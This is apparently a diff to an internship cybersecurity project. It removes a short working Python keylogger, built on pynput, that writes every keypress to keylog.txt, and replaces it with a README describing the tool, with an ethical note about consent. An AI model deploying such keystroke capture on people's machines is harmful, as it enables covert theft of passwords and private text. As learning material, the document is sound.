@@ -1,17 +1,25 @@
-# PRODIGY_CS_04
-from pynput import keyboard
+# PRODIGY_CS_04 - Simple Keylogger 🛡️
 
-# File to store logs
-log_file = "keylog.txt"
+## 💼 Internship
+**Domain:** Cyber Security  
+**Company:** Prodigy InfoTech  
+**Task 4:** Simple Keylogger
 
-def on_press(key):
-    try:
-        with open(log_file, "a") as file:
-            file.write(f"{key.char}")
-    except AttributeError:
-        with open(log_file, "a") as file:
-            file.write(f"[{key}]")
+## 📌 Objective
+Create a Python-based keylogger that captures and logs all keystrokes typed by the user. This is intended purely for **educational purposes**, focusing on understanding how key events are captured.
 
-# Start listener
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+## ⚙️ Features
+- Logs all keys pressed by the user
+- Stores logs in a text file `keylog.txt`
+- Uses the `pynput` library for keyboard event handling
+
+## ⚠️ Ethical Note
+This project is created **strictly for learning**.  
+⚠️ Never use this script on anyone else’s computer or without clear consent.  
+**Misuse of keyloggers can be illegal and unethical.**
+
+## 📦 Requirements
+To install the necessary Python library:
+
+```bash
+pip install pynput
